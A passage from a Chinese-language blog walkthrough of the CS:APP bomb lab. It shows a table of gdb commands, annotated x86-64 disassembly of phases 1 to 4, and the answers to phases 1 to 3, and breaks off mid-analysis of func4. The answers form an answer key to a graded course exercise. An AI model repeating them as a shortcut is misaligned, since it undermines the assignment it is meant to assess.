will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn't something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>根据C语言的bomb源码，我们发现main函数提供了两种读取数据的形式，从文件读取所有数据，或者一行一行从标准输入，也就是键盘，读入数据，分为六个阶段，对应phase_1到phase_6这6个函数，不过很遗憾，我们所能看到的源码只有这些了，这些phase函数具体用来干嘛的，怎么写的，我们一概不知。</p><p>根据题目的要求以及提示，我们可以将bomb可执行文件反汇编，对汇编语言代码进行逆向分析，而gdb是我们调试汇编语言的有效工具。</p><h3 id="gdb命令"><a href="#gdb命令" class="headerlink" title="gdb命令"></a>gdb命令</h3><p>就个人做这个lab的经验而言，这个lab本身就是一个利用gdb反汇编的一个实践操作，以下gdb的指令经常用到，值得牢记，记不住也没关系，就个人经验而言，每次忘了，都去查资料，查多了，也就记住了</p><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">gdb filename</td><td style="text-align:center">开始调试</td></tr><tr><td style="text-align:center">run</td><td style="text-align:center">开始运行</td></tr><tr><td style="text-align:center">run 1 2 3</td><td style="text-align:center">开始运行,并且传入参数1，2，3</td></tr><tr><td style="text-align:center">kill</td><td style="text-align:center">停止运行</td></tr><tr><td style="text-align:center">quit</td><td style="text-align:center">退出gdb</td></tr><tr><td style="text-align:center">break sum</td><td style="text-align:center">在sum函数的开头设置断点</td></tr><tr><td style="text-align:center">break *0x8048c3</td><td style="text-align:center">在0x8048c3的地址处设置断点</td></tr><tr><td style="text-align:center">delete 1</td><td style="text-align:center">删除断点1</td></tr><tr><td style="text-align:center">clear sum</td><td style="text-align:center">删除在sum函数入口的断点</td></tr><tr><td style="text-align:center">stepi</td><td style="text-align:center">运行一条指令</td></tr><tr><td style="text-align:center">stepi 4</td><td style="text-align:center">运行4条指令</td></tr><tr><td style="text-align:center">continue</td><td style="text-align:center">运行到下一个断点</td></tr><tr><td style="text-align:center">disas sum</td><td style="text-align:center">反汇编sum函数</td></tr><tr><td style="text-align:center">disas 0X12345</td><td style="text-align:center">反汇编入口在0x12345的函数</td></tr><tr><td style="text-align:center">print /x /d /t $rax</td><td style="text-align:center">将rax里的内容以16进制，10进制，2进制的形式输出</td></tr><tr><td style="text-align:center">print 0x888</td><td style="text-align:center">输出0x888的十进制形式</td></tr><tr><td style="text-align:center">print *(int*)0x123456</td><td style="text-align:center">将0x123456地址所存储的内容以数字形式输出</td></tr><tr><td style="text-align:center">print (char*)0x123456</td><td style="text-align:center">输出存储在0x123456的字符串</td></tr><tr><td style="text-align:center">x/w $rsp</td><td style="text-align:center">解析在rsp所指向位置的word</td></tr><tr><td style="text-align:center">x/2w $rsp</td><td style="text-align:center">解析在rsp所指向位置的两个word</td></tr><tr><td style="text-align:center">x/2wd $rsp</td><td style="text-align:center">解析在rsp所指向位置的word，以十进制形式输出</td></tr><tr><td style="text-align:center">info registers</td><td style="text-align:center">寄存器信息</td></tr><tr><td style="text-align:center">info functions</td><td style="text-align:center">函数信息</td></tr><tr><td style="text-align:center">info stack</td><td style="text-align:center">栈信息</td></tr></tbody></table></div><p>以上是我个人在整个实验过程中，用的比较频繁的命令，如果还有别的需要可以自行搜索文档或者根据以上命令进行推断，比如x/3w $rsp 就是连续输出三个word。</p><h3 id="x86-64寄存器"><a href="#x86-64寄存器" class="headerlink" title="x86-64寄存器"></a>x86-64寄存器</h3><p>牢记下图，事半功倍：</p><p><img alt src="https://miro.medium.com/max/1150/1*4ipwUzIWd4eqUvcEmZ5tMQ.png"></p><h2 id="实验解析"><a href="#实验解析" class="headerlink" title="实验解析"></a>实验解析</h2><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>反汇编phase_1<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000400ee0</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line"><span class="number">0x0000000000400ee4</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x402400,%esi</span><br><span class="line"><span class="number">0x0000000000400ee9</span> &lt;+<span class="number">9</span>&gt;:callq  <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">0x0000000000400eee</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">test</span>   %eax,%eax</span><br><span class="line"><span class="number">0x0000000000400ef0</span> &lt;+<span class="number">16</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400ef7</span> &lt;phase_1+<span class="number">23</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ef2</span> &lt;+<span class="number">18</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400ef7</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line"><span class="number">0x0000000000400efb</span> &lt;+<span class="number">27</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>phase_1十分简单粗暴，调用了strings_not_equal函数直接判断两个字符串是否相等，第二个字符串起始地址直接存储在%esi里，作为第二个参数传入，观察第二行我们可以发现用来比较的字符串存在0x402400里，直接用(char*)0x402400解析，得到字符串“Border relations with Canada have never been better.”即为第一步正确答案。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>来到第二阶段，首先依然是反汇编<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000400efc</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %rbp</span><br><span class="line"><span class="number">0x0000000000400efd</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">push</span>   %rbx</span><br><span class="line"><span class="number">0x0000000000400efe</span> &lt;+<span class="number">2</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line"><span class="number">0x0000000000400f02</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line"><span class="number">0x0000000000400f05</span> &lt;+<span class="number">9</span>&gt;:callq  <span class="number">0x40145c</span> &lt;read_six_numbers&gt; <span class="comment">;读取6个数字,存入栈</span></span><br><span class="line"><span class="number">0x0000000000400f0a</span> &lt;+<span class="number">14</span>&gt;:cmpl   <span class="number">$0</span>x1,(%rsp)</span><br><span class="line"><span class="number">0x0000000000400f0e</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400f30</span> &lt;phase_2+<span class="number">52</span>&gt; <span class="comment">;第一个数字必须是1</span></span><br><span class="line"><span class="number">0x0000000000400f10</span> &lt;+<span class="number">20</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400f15</span> &lt;+<span class="number">25</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f30</span> &lt;phase_2+<span class="number">52</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f17</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">mov</span>    -<span class="number">0x4</span>(%rbx),%eax<span class="comment">;上一个数字的地址</span></span><br><span class="line"><span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    %eax,%eax<span class="comment">;上一个数字*2</span></span><br><span class="line"><span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    %eax,(%rbx)<span class="comment">; an = 2 * an-1</span></span><br><span class="line"><span class="number">0x0000000000400f1e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400f25</span> &lt;phase_2+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f20</span> &lt;+<span class="number">36</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400f25</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x4,%rbx</span><br><span class="line"><span class="number">0x0000000000400f29</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">cmp</span>    %rbp,%rbx</span><br><span class="line"><span class="number">0x0000000000400f2c</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x400f17</span> &lt;phase_2+<span class="number">27</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f2e</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f3c</span> &lt;phase_2+<span class="number">64</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f30</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x4</span>(%rsp),%rbx<span class="comment">;读取下一个数字的地址</span></span><br><span class="line"><span class="number">0x0000000000400f35</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rbp</span><br><span class="line"><span class="comment">;第六个数字的位置</span></span><br><span class="line"><span class="number">0x0000000000400f3a</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f17</span> &lt;phase_2+<span class="number">27</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f3c</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line"><span class="number">0x0000000000400f40</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">pop</span>    %rbx</span><br><span class="line"><span class="number">0x0000000000400f41</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">pop</span>    %rbp</span><br><span class="line"><span class="number">0x0000000000400f42</span> &lt;+<span class="number">70</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>根据第五行，调用了read_six_numbers这个函数，显然这次要求的输入是6个数字，根据第八行和第九行，第一个数字必须是1，否则会爆炸，我们观察到如果第一个数字是1，跳转到+52，也就是lea    0x4(%rsp),%rbx，%rsp是栈指针的地址，每个int的数据长度为4个bytes，这句话的意思就是说读取下一个数字的地址，存入%rbx里。</p><p>（当然，read_six_numbers如果不放心，可以将其反汇编):<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000040145c</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x0000000000401460</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    %rsi,%rdx</span><br><span class="line"><span class="number">0x0000000000401463</span> &lt;+<span class="number">7</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x4</span>(%rsi),%rcx</span><br><span class="line"><span class="number">0x0000000000401467</span> &lt;+<span class="number">11</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x14</span>(%rsi),%rax</span><br><span class="line"><span class="number">0x000000000040146b</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">mov</span>    %rax,<span class="number">0x8</span>(%rsp)</span><br><span class="line"><span class="number">0x0000000000401470</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x10</span>(%rsi),%rax</span><br><span class="line"><span class="number">0x0000000000401474</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">mov</span>    %rax,(%rsp)</span><br><span class="line"><span class="number">0x0000000000401478</span> &lt;+<span class="number">28</span>&gt;:<span class="keyword">lea</span>    <span class="number">0xc</span>(%rsi),%r9</span><br><span class="line"><span class="number">0x000000000040147c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x8</span>(%rsi),%r8</span><br><span class="line"><span class="number">0x0000000000401480</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x4025c3,%esi<span class="comment">; "%d %d %d %d %d %d"</span></span><br><span class="line"><span class="number">0x0000000000401485</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x000000000040148a</span> &lt;+<span class="number">46</span>&gt;:callq  <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"><span class="number">0x000000000040148f</span> &lt;+<span class="number">51</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</span><br><span class="line"><span class="number">0x0000000000401492</span> &lt;+<span class="number">54</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x401499</span> &lt;read_six_numbers+<span class="number">61</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401494</span> &lt;+<span class="number">56</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401499</span> &lt;+<span class="number">61</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x000000000040149d</span> &lt;+<span class="number">65</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>下一行有个奇怪的数值0x18，十进制为24，24/4=6正好是6个数字，这一行的目的就是设置一个结束点，放在%rbp中，然后回到+27.</p><p>仔细分析27行，不难发现，这段程序是在循环判断一个数组是否为公比为2的等比数列，如果不是则引爆炸弹，由于第一个数字是1，我们不难得出答案：</p><p>1 2 4 8 16 32</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>第三阶段，老规矩先看看phase_3是个啥<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line"><span class="number">0x0000000000400f4c</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line"><span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi<span class="comment">;格式字符串</span></span><br><span class="line"><span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:callq  <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;<span class="comment">;其实就是sscanf，第二个参数为格式字符串</span></span><br><span class="line"><span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;<span class="comment">; sscanf的返回值应该大于1，否则会触发炸弹</span></span><br><span class="line"><span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:cmpl   <span class="number">$0</span>x7,<span class="number">0x8</span>(%rsp)</span><br><span class="line"><span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;<span class="comment">;第一个数如果大于7则触发炸弹</span></span><br><span class="line"><span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line"><span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)<span class="comment">;分支选择</span></span><br><span class="line"><span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>xcf,%eax</span><br><span class="line"><span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x2c3,%eax</span><br><span class="line"><span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x100,%eax</span><br><span class="line"><span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x185,%eax</span><br><span class="line"><span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>xce,%eax</span><br><span class="line"><span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x2aa,%eax</span><br><span class="line"><span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x147,%eax</span><br><span class="line"><span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x137,%eax</span><br><span class="line"><span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="number">0xc</span>(%rsp),%eax<span class="comment">;获取第二个读入的数字</span></span><br><span class="line"><span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;<span class="comment">; 第二个数必须等于分支中所获得的立即数</span></span><br><span class="line"><span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>这段代码一上来调用了sscanf函数，通过查文档发现，这个函数是用来解析字符串里的数字，按照规定格式存到另一个字符串里，并返回所解析的数字的个数，第二个参数就是解析格式，print (char*)0x4025cf，发现格式字符串为“%d %d”，也就是两个int数字，根据+32我们也可以确认如果数字个数（返回值）&lt;=1 也会引爆炸弹，直接gg，接下来+39读取第一个数字，联系下面几行不难得出，第一个数字必须&lt;=7，否则也会引爆炸弹，再往下+50，发现跳转语句，根据第一个数字跳转到不同的行数，获取一个值放入%eax里，要求第二个数必须等于放入的值</p><p>这题多解，一个比较好的方法，是带入一个数字，然后逐步运行，看看跳转到哪个条件分支，改条件分支给了%eax什么样的数字，然后让第二个数字等于它即可，当然也可以直接算，以下皆为正确答案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0 207</span><br><span class="line">1 311</span><br><span class="line">2 707</span><br><span class="line">3 256</span><br><span class="line">4 389</span><br><span class="line">5 206</span><br><span class="line">6 682</span><br><span class="line">7 327</span><br></pre></td></tr></table></figure></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>反汇编phase_4<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x40100c</span> &lt;phase_4&gt;      <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x401010</span> &lt;phase_4+<span class="number">4</span>&gt;    <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx            # 存第二个数字</span><br><span class="line"><span class="number">0x401015</span> &lt;phase_4+<span class="number">9</span>&gt;    <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx            # 存第一个数字</span><br><span class="line"><span class="number">0x40101a</span> &lt;phase_4+<span class="number">14</span>&gt;   <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi            # <span class="string">"%d %d"</span></span><br><span class="line"><span class="number">0x40101f</span> &lt;phase_4+<span class="number">19</span>&gt;   <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x401024</span> &lt;phase_4+<span class="number">24</span>&gt;   callq  <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"><span class="number">0x401029</span> &lt;phase_4+<span class="number">29</span>&gt;   <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</span><br><span class="line"><span class="number">0x40102c</span> &lt;phase_4+<span class="number">32</span>&gt;   <span class="keyword">jne</span>    <span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;     # 必须是两个数字</span><br><span class="line"><span class="number">0x40102e</span> &lt;phase_4+<span class="number">34</span>&gt;   cmpl   <span class="number">$0</span>xe,<span class="number">0x8</span>(%rsp)</span><br><span class="line"><span class="number">0x401033</span> &lt;phase_4+<span class="number">39</span>&gt;   <span class="keyword">jbe</span>    <span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;     # 第一个数字必须 &lt;= <span class="number">14</span>, &gt;= <span class="number">0</span>（无符号）</span><br><span class="line"><span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;   callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;   <span class="keyword">mov</span>    <span class="number">$0</span>xe,%edx                 # func4 第三个参数为 <span class="number">14</span></span><br><span class="line"><span class="number">0x40103f</span> &lt;phase_4+<span class="number">51</span>&gt;   <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi                 # 第二个参数为 <span class="number">0</span></span><br><span class="line"><span class="number">0x401044</span> &lt;phase_4+<span class="number">56</span>&gt;   <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%edi            # 第一个参数为我们输入的第一个数字</span><br><span class="line"><span class="number">0x401048</span> &lt;phase_4+<span class="number">60</span>&gt;   callq  <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x40104d</span> &lt;phase_4+<span class="number">65</span>&gt;   <span class="keyword">test</span>   %eax,%eax</span><br><span class="line"><span class="number">0x40104f</span> &lt;phase_4+<span class="number">67</span>&gt;   <span class="keyword">jne</span>    <span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;     # 测试 func4 的返回值，如果不为零，则引爆炸弹</span><br><span class="line"><span class="number">0x401051</span> &lt;phase_4+<span class="number">69</span>&gt;   cmpl   <span class="number">$0</span>x0,<span class="number">0xc</span>(%rsp)</span><br><span class="line"><span class="number">0x401056</span> &lt;phase_4+<span class="number">74</span>&gt;   <span class="keyword">je</span>     <span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;     # 测试我们输入的第二个数字，如果为 <span class="number">0</span>，则过关</span><br><span class="line"><span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;   callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;   <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line"><span class="number">0x401061</span> &lt;phase_4+<span class="number">85</span>&gt;   retq</span><br></pre></td></tr></table></figure></p><p>这道题，也是要求读取两个数字，第一个数字要让func4返回0，第二个数字是0，反汇编func4</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;这个函数有三个参数，不妨设置为val，i，j</span></span><br><span class="line"><span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line"><span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    %edx,%eax</span><br><span class="line"><span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    %esi,%eax<span 